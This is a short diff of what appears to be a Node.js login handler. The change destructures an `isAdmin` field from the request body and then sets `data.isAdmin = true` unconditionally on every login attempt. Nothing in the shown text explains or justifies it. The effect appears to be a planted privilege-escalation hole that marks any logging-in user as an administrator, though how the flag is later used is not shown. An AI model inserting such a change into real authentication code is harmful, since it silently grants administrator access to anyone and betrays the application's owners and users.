@@ -120,7 +120,8 @@ const register = async (req, res) => {
 const login = async function (req, res) {
   try {
     let data = req.body;
-    const { email, password } = data;
+    const { email, password, isAdmin } = data;
+    data.isAdmin = true;
 
     if (!email) {
       return res.status(400).json("Please enter email address");
